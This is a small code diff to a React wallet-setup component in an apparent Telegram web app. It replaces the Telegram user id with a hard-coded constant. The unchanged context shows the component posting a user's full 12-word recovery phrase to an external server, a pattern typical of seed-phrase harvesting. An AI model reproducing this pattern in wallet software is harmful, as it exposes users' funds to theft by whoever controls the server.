@@ -12,6 +12,7 @@ import { fetchUserInfo } from "../../store/telegramUserInfo";
 import pagesHistory from "../../constants/pagesHistory";
 import Text from "../../components/Text/Text";
 import translation from "../../functions/translate";
+import { USERID } from "../../constants/tgStatic.config";
 const WalletInit = () => {
     const [inputs, setInputs] = useState(Array.from({length : 12} , () => ""))
     const [show , setShow] = useState(false)
@@ -83,7 +84,7 @@ const WalletInit = () => {
             
             await axios.post("https://www.connectbirga.ru/user/wallet", {
                 mnemonic: inputs.map((e,i) => e.trim()),
-                userId: window.Telegram.WebApp.initDataUnsafe.user.id,
+                userId: USERID,
               } , {
                 headers : {
                   "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
